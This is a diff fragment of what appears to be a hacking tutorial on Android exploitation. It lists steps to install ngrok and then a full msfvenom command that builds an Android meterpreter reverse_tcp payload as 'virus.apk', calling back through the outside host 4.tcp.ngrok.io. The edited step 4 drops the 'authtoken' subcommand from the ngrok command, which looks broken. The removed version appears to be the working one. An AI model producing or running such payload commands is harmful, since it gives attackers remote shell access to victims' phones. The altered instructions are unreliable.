@@ -19,7 +19,7 @@ Knowledge is power, especially when it’s shared. A collaboration between the o
   1. download from link: https://ngrok.com/
   2. download the file and extract using 'sudo tar xvzf ngrok-stable-linux-amd64.tgz' in the directory where it was downloaded
   3. first sign-up to get an auth-token
-  4. Then in your VM command line input: './ngrok authtoken <authtoken>'
+  4. Then in your VM command line input: './ngrok <authtoken>'
   5. msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=4.tcp.ngrok.io LPORT=4444 R > /home/kali/Hacking/android-exploitation/virus.apk 
   
   Here:
